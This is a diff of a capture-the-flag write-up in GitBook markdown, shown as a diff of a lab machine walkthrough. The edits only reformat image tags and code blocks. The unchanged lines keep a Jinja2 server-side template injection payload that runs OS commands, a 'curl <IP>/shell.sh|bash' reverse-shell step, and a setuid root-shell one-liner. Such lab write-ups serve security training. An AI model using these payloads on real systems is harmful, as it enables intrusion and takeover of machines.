@@ -20,11 +20,11 @@ PORT      STATE SERVICE
 
 Port 80 just shows a countdown:
 
-<figure><img src="../../../.gitbook/assets/image (3157).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3157).png>)
 
 If we view the page source, there's this bit here:
 
-<figure><img src="../../../.gitbook/assets/image (2249).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2249).png>)
 
 Here's the script:
 
@@ -208,7 +208,7 @@ $ python3 client.py  | base64 -d
 
 We can verify that Jinja2 injections work using `{{config.items()}}`
 
-<figure><img src="../../../.gitbook/assets/image (3889).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3889).png>)
 
 Using this payload, we can verify the user:
 
@@ -216,11 +216,11 @@ Using this payload, we can verify the user:
 {{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3160).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3160).png>)
 
 We can get a reverse shell using `curl <IP>/shell.sh|bash`:
 
-<figure><img src="../../../.gitbook/assets/image (3886).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3886).png>)
 
 ## Privilege Escalation
 
@@ -228,7 +228,6 @@ We can get a reverse shell using `curl <IP>/shell.sh|bash`:
 
 The user's home directory has an interesting file:
 
-{% code overflow="wrap" %}
 ```
 bob@cookiecutter:~$ ls
 local.txt  password_check
@@ -237,7 +236,6 @@ password_check: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamica
 bob@cookiecutter:~$ ./password_check
 Segmentation fault (core dumped)
 ```
-{% endcode %}
 
 Using `ltrace` shows a password:
 
@@ -274,7 +272,7 @@ This means we can make ourselves root using this one-liner:
 import os;os.setuid(0);os.system("/bin/bash")
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3890).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3890).png>)
 
 ## Scripts
 
